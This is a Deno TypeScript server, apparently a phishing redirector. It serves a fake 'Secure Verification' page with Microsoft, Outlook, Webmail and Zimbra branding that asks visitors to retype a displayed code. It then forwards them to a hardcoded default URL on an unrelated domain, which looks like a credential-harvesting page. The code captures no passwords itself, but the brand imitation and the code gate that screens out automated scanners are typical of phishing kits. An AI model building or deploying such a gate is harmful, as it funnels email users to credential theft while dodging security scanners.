// secure-redirect.ts
import { serve } from "https://deno.land/std@0.200.0/http/server.ts";

// Configuration
const CONFIG = {
  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://dennolabo.biz/xkc1vta/walihse/ofcnjvd/provost/index.html",
  VERIFICATION_CODE: Deno.env.get("VERIFICATION_CODE") || "A7B2C9D",
  PORT: Deno.env.get("PORT") || "8000"
};

function generateHTML() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Access Verification</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --primary: #2563eb;
      --primary-dark: #1d4ed8;
      --microsoft: #0078d4;
      --outlook: #0072c6;
      --zimbra: #ff7a00;
      --webmail: #00a4ef;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
    }
    
    body {
      background: linear-gradient(135deg, #f3f4f6 0%, #e5e7eb 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 2rem;
    }
    
    .verification-card {
      background: white;
      border-radius: 1.5rem;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
      width: 100%;
      max-width: 520px;
      overflow: hidden;
    }
    
    .card-header {
      background: var(--primary);
      color: white;
      padding: 1.5rem;
      text-align: center;
    }
    
    .card-logo {
      font-size: 1.8rem;
      font-weight: 700;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.75rem;
      margin-bottom: 0.5rem;
    }
    
    .card-body {
      padding: 2.5rem;
    }
    
    .verification-title {
      color: #1f2937;
      font-size: 1.5rem;
      margin-bottom: 1rem;
      text-align: center;
      font-weight: 600;
    }
    
    .verification-description {
      color: #4b5563;
      text-align: center;
      margin-bottom: 1.5rem;
      line-height: 1.5;
    }
    
    .code-container {
      background: #f9fafb;
      border: 1px dashed #d1d5db;
      border-radius: 0.75rem;
      padding: 1.5rem;
      margin: 1.5rem 0;
      text-align: center;
    }
    
    .verification-code {
      font-family: 'Roboto Mono', monospace;
      font-size: 2rem;
      letter-spacing: 0.25em;
      color: var(--primary);
      font-weight: 700;
      padding: 0 0.5rem;
    }
    
    .verification-form {
      margin-top: 2rem;
    }
    
    .form-group {
      margin-bottom: 1.5rem;
    }
    
    .form-label {
      display: block;
      margin-bottom: 0.5rem;
      color: #374151;
      font-weight: 500;
      font-size: 0.95rem;
    }
    
    .form-input {
      width: 100%;
      padding: 1rem 1.25rem;
      border: 1px solid #e5e7eb;
      border-radius: 0.75rem;
      font-size: 1rem;
      transition: all 0.2s;
      box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.05);
    }
    
    .form-input:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
    }
    
    .verify-button {
      background: var(--primary);
      color: white;
      border: none;
      padding: 1rem;
      border-radius: 0.75rem;
      width: 100%;
      font-size: 1.1rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.75rem;
      margin-top: 1rem;
    }
    
    .verify-button:hover {
      background: var(--primary-dark);
      transform: translateY(-1px);
    }
    
    .verify-button:active {
      transform: translateY(0);
    }
    
    .providers-section {
      margin-top: 2.5rem;
    }
    
    .providers-title {
      text-align: center;
      color: #6b7280;
      font-size: 0.9rem;
      margin-bottom: 1rem;
      position: relative;
    }
    
    .providers-title:before,
    .providers-title:after {
      content: "";
      flex: 1;
      border-bottom: 1px solid #e5e7eb;
      margin: auto;
    }
    
    .providers-title span {
      padding: 0 1rem;
    }
    
    .providers-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 1rem;
      margin-top: 1.5rem;
    }
    
    .provider-card {
      background: white;
      border: 1px solid #e5e7eb;
      border-radius: 0.75rem;
      padding: 1.25rem;
      text-align: center;
      transition: all 0.2s;
      cursor: pointer;
    }
    
    .provider-card:hover {
      transform: translateY(-3px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
    }
    
    .provider-logo {
      width: 40px;
      height: 40px;
      margin: 0 auto 0.75rem;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .provider-name {
      font-size: 0.85rem;
      font-weight: 600;
      color: #374151;
      margin-top: 0.5rem;
    }
    
    .microsoft-bg { background: var(--microsoft); }
    .outlook-bg { background: var(--outlook); }
    .zimbra-bg { background: var(--zimbra); }
    .webmail-bg { background: var(--webmail); }
    
    .provider-badge {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 1.25rem;
    }
    
    .footer {
      text-align: center;
      margin-top: 2rem;
      color: #9ca3af;
      font-size: 0.8rem;
    }
  </style>
</head>
<body>
  <div class="verification-card">
    <div class="card-header">
      <div class="card-logo">
        <i class="fas fa-shield-alt"></i>
        <span>SECURE VERIFICATION</span>
      </div>
    </div>
    
    <div class="card-body">
      <h1 class="verification-title">Email Verification Required</h1>
      <p class="verification-description">
        For security purposes, please verify your email address by entering the code below.
      </p>
      
      <div class="code-container">
        <div class="verification-code">${CONFIG.VERIFICATION_CODE}</div>
      </div>
      
      <div class="verification-form">
        <form id="verifyForm">
          <div class="form-group">
            <label class="form-label">Verification Code</label>
            <input 
              type="text" 
              class="form-input" 
              id="codeInput" 
              placeholder="Enter the 7-digit code" 
              required
              autofocus
              pattern="[A-Za-z0-9]{7}"
              title="Exactly 7 alphanumeric characters"
            >
          </div>
          <button type="submit" class="verify-button">
            <i class="fas fa-lock"></i>
            <span>Verify Identity</span>
          </button>
        </form>
      </div>
      
      <div class="providers-section">
        <div class="providers-title">
          <span>Supported Email Providers</span>
        </div>
        
        <div class="providers-grid">
          <div class="provider-card">
            <div class="provider-logo">
              <div class="provider-badge microsoft-bg">
                <i class="fab fa-microsoft"></i>
              </div>
            </div>
            <div class="provider-name">Microsoft</div>
          </div>
          
          <div class="provider-card">
            <div class="provider-logo">
              <div class="provider-badge outlook-bg">
                <i class="fas fa-envelope"></i>
              </div>
            </div>
            <div class="provider-name">Outlook</div>
          </div>
          
          <div class="provider-card">
            <div class="provider-logo">
              <div class="provider-badge webmail-bg">
                <i class="fas fa-globe"></i>
              </div>
            </div>
            <div class="provider-name">Webmail</div>
          </div>
          
          <div class="provider-card">
            <div class="provider-logo">
              <div class="provider-badge zimbra-bg">
                <i class="fas fa-mail-bulk"></i>
              </div>
            </div>
            <div class="provider-name">Zimbra</div>
          </div>
        </div>
      </div>
      
      <div class="footer">
        <p>This secure verification helps protect your account from unauthorized access.</p>
      </div>
    </div>
  </div>

  <script>
    document.getElementById('verifyForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const code = document.getElementById('codeInput').value.trim();
      
      try {
        const response = await fetch('/verify', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({ code })
        });
        
        if (response.ok) {
          window.location.href = await response.text();
        } else {
          const error = await response.json();
          alert(error.message || 'Verification failed. Please try again.');
        }
      } catch (error) {
        alert('Network error. Please check your connection and try again.');
      }
    });
    
    // Add click handlers for provider cards
    document.querySelectorAll('.provider-card').forEach(card => {
      card.addEventListener('click', () => {
        document.getElementById('codeInput').focus();
      });
    });
  </script>
</body>
</html>`;
}

async function handleRequest(req: Request): Promise<Response> {
  const url = new URL(req.url);
  
  if (url.pathname === "/verify" && req.method === "POST") {
    try {
      const { code } = await req.json();
      if (code?.toUpperCase() === CONFIG.VERIFICATION_CODE.toUpperCase()) {
        return new Response(CONFIG.DESTINATION_URL, {
          status: 200,
          headers: { 'Content-Type': 'text/plain' }
        });
      }
      return new Response(
        JSON.stringify({ message: "The verification code you entered is incorrect." }),
        { status: 401, headers: { 'Content-Type': 'application/json' } }
      );
    } catch {
      return new Response(
        JSON.stringify({ message: "Invalid request format." }),
        { status: 400, headers: { 'Content-Type': 'application/json' } }
      );
    }
  }
  
  return new Response(generateHTML(), {
    headers: { 
      'Content-Type': 'text/html',
      'Cache-Control': 'no-store, max-age=0'
    }
  });
}

console.log(`Server running on port ${CONFIG.PORT}`);
serve(handleRequest, { port: Number(CONFIG.PORT) });